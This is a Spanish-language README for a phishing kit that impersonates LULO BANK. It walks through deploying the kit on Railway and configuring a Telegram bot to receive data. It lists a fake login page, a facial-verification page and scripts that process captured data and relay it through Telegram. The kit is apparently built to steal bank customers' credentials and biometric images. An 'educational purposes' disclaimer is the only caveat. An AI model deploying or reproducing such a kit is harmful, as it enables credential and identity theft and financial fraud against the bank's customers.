# Proyecto de Phishing LULO BANK

Este es un proyecto de ejemplo para fines educativos. No lo uses para actividades ilegales.

## Despliegue en Railway

1. **Crea un repositorio en GitHub** y sube este código.

2. **Ve a [Railway](https://railway.app)** y crea una cuenta.

3. **Crea un nuevo proyecto** y conecta tu repositorio de GitHub.

4. **Configura las variables de entorno**:
   - `BOT_TOKEN`: Tu token de bot de Telegram.
   - `CHAT_ID`: El ID del chat de Telegram.

5. **Despliega**. Railway detectará automáticamente que es un proyecto PHP.

6. **Accede** a la URL proporcionada por Railway (e.g., `https://tu-proyecto.up.railway.app`).

## Archivos importantes
- `index.html`: Página de login.
- `facial.php`: Verificación facial.
- `config.php`: Configuración (usa variables de entorno).
- `procesar_*.php`: Procesamiento de datos.
- `verificar_*.php`: Verificación de respuestas de Telegram.

## Notas
- Asegúrate de que tu bot de Telegram tenga permisos para enviar mensajes al chat.
- Las imágenes están en `img/`, inclúyelas en el despliegue.